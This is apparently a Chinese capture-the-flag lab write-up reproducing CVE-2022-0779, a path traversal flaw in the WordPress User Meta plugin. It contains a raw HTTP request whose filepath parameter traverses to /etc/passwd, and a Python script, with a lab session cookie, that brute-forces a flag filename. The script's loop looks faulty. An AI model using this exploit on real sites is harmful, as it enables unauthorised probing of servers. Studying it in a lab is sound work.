---
title: CVE-2022-0779【路径遍历漏洞】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - '路径遍历漏洞'
---

## 1. 漏洞介绍

WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。

WordPress plugin User Meta Manager 2.4.3版本及之前版本存在路径遍历漏洞，该漏洞源于在处理 Ajax 操作 um_show_uploaded_file 时，对路径数据没有进行验证。

## 2. 漏洞分析

[WordPress User Meta Lite / Pro 2.4.3 Path Traversal - CXSecurity.com](https://cxsecurity.com/issue/WLB-2022050096)

[User Meta < 2.4.4 - Subscriber+ Local File Enumeration via Path Traversal](https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd/)

注，该漏洞仅可验证文件是否存在并不能直接读取文件

## 3. 漏洞复现

登录test/test，

poc

```http
As a subscriber, submit a dummy image on a page/post with a File Upload field is embed, intercept the request and change the file path parameter

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 158
Connection: close
Cookie: [subscriber+]

field_name=test&filepath=/../../../../../../../../etc/passwd&field_id=um_field_4&form_key=Upload&action=um_show_uploaded_file&pf_nonce=4286c1c56a&is_ajax=true

If the response contains the um_remove_file, then the file exist on the server, otherwise it does not
```

注，其中pf_nonce的值需要到页面源码中找

如果返回值中有 ‘umRemoveFile’ 就代表此文件存在

![0.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251123809.png)

根据提示访问 1.txt

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251124704.png)

需要对flag文件名爆破，脚本如下【注意对cookie，pf_nonce，url更换】

```python
import requests  
  
  
def getInfo(file):  
    headers = {  
        "Accept": "*/*",  
        "Accept-Language": "en-GB,en;q=0.5",  
        "Accept-Encoding": "gzip, deflate",  
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",  
        "X-Requested-With": "XMLHttpRequest",  
        "Cookie": "wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_ff4d7f4925eeb2aae706e60d2f109fb8=test%7C1701054017%7C9ZZeRuCrD5o1xN1AZlhymb2gDZwLyPu9UM7VAwT25vm%7Cbcfa0bde3f3d80328429c3c83c850b5a8565c3ddf971a087fe4717082d864779; wp-settings-time-2=1700881222",  
  
    }  
  
    url = "http://eci-2ze48igh9i0sd3e06myz.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php"  
    data = {  
        'field_name': 'test',  
        'filepath': '/../../../../../../../../flagfile/' + file,  
        'field_id': 'um_field_4',  
        'form_key': 'Upload',  
        'action': 'um_show_uploaded_file',  
        'pf_nonce': '31403479b8',  
        'is_ajax': True,  
    }  
  
    r = requests.post(url, headers=headers, data=data)  
    # print(r.text)  
    if "umRemoveFile" in r.text:  
        return True  
    else:  
        return False  
  
  
if __name__ == '__main__':  
  
    key = '1234567890abcdefghijklmnopqrstuvwxyz'  
    for i in range(0, 10):  # 随机字符串是10位  
        for w in key:  
            file = str(i) + str(w)  
            if getInfo(file):  
                print(w, end="")  
                break
```

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311251126308.png)

看别人的做法是浏览器加上这个随机字符串即可得flag，但我这边却是404……
